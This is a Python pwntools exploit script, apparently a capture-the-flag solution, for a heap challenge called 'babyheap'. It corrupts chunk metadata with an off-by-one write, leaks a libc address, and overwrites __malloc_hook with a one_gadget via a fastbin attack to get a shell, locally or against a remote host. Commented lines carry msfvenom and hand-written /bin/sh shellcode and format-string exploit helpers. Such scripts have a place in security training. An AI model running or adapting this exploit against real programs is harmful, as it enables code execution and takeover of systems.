#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Date    : 2017-05-22 10:39:31
# @Author  : WinterSun (511683586@qq.com)
# @Link    : https://Winter3un.github.io/
import roputils,os,time
from pwn import *
context(log_level="debug",arch="x86_64")
DEBUG = 1
target = "./babyheap"
remote_ip = ""
port = 0
rop = roputils.ROP(target)
elf = ELF(target)
libc = ELF("./libc.so.6")
# payload = rop.call('__isoc99_scanf', 0x804888F,0x0804A034)
# libc = ELF[target]
# msfvenom -p linux/x86/exec CMD=/bin/sh -b "\x0b\x00" -f python
#buf =  ""
# buf += "\x2b\xc9\x83\xe9\xf5\xe8\xff\xff\xff\xff\xc0\x5e\x81"
# buf += "\x76\x0e\x7d\x30\x90\xf9\x83\xee\xfc\xe2\xf4\x17\x3b"
# buf += "\xc8\x60\x2f\x56\xf8\xd4\x1e\xb9\x77\x91\x52\x43\xf8"
# buf += "\xf9\x15\x1f\xf2\x90\x13\xb9\x73\xab\x95\x38\x90\xf9"
# buf += "\x7d\x1f\xf2\x90\x13\x1f\xe3\x91\x7d\x67\xc3\x70\x9c"
# buf += "\xfd\x10\xf9"

# int 0x80 linux x86 0x1c
# buf = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80";


# bss = rop.section('.bss')
# rop.got('puts')
# rop.call('read', 0, addr_bss, 0x100)
# msfvenom -p linux/x86/exec CMD=/bin/sh -f python -b '\x00\x0b\x0d\x0a'

# def exec_fmt(payload):
# 	p = process(target)
# 	p.recvuntil("input:")
# 	p.sendline(payload)
# 	p.recvuntil("input:")
# 	p.sendline(payload)
# 	return p.recvuntil(",")[:-1]
# autofmt = FmtStr(exec_fmt)
# offset = autofmt.offset

# def send_payload(payload):
# 	sl(payload+"%100000c")
# autofmt = FmtStr(send_payload,offset=offset)

# autofmt.write(free_hook_addr,one_gadget_addr)
# autofmt.execute_writes()



if DEBUG:
	p = process(target,env={"LD_LIBRARY_PATH":sys.path[0]})
	# gdb.attach(p,"b*main\nc")
else:
	p = remote(remote_ip,port)

def sl(data):
	p.sendline(data)
def sd(data):
	p.send(data)
def ru(data):
	return p.recvuntil(data)

def add(size):
	ru("Command:")
	sl("1")
	ru("Size: ")
	sl(str(size))
def fill(index,size,data):
	ru("Command: ")
	sl("2")
	ru("Index: ")
	sl(str(index))
	ru("Size: ")
	sl(str(size))
	ru("Content: ")
	sl(data)
def free(index):
	ru("Command: ")
	sl("3")
	ru("Index: ")
	sl(str(index))
def dump(index):
	ru("Command: ")
	sl("4")
	ru("Index: ")
	sl(str(index))

add(0x20) #index0
add(0x1e0) #index1
add(0x200) #index2
add(0x200) #index3

free(1) #free index1

payload = "a"*0x28+"\x30"

fill(0,len(payload),payload)
add(0x80) #index1
add(0x60) #index4

free(1) #free 1
free(2) #free 2

add(0x80) #index1

dump(4)

ru("\n")
libc_bin_addr = u64(p.recv(8))
# bin_offset = 0x3a5678
one_gadget_offset = 0x4425a
local_bin_offset = 0x3C4C58
libc_base = libc_bin_addr - local_bin_offset
libc.address = libc_base

one_gadget_addr = one_gadget_offset+libc_base

malloc_offset = 0x3C4BD0
malloc_addr = malloc_offset + libc_base


#change index 4 meta
payload = flat("a"*0x80,0x90,0x70)
fill(1,len(payload),payload)
free(4)
payload = flat("a"*0x80,0x90,0x70,libc.symbols['__malloc_hook']-0x23)
print hex(libc.symbols['__malloc_hook']-0x23)

fill(1,len(payload),payload)
add(0x60) #2
add(0x60) #4
payload = flat("\x00"*19,one_gadget_addr)
fill(4,len(payload),payload)
raw_input()
add(0x90)


print "libc_bin_addr="+hex(libc_bin_addr)
print "libc_base="+hex(libc_base)
print "one_gadget_addr="+hex(one_gadget_addr)
print "malloc_addr="+hex(malloc_addr)
p.interactive()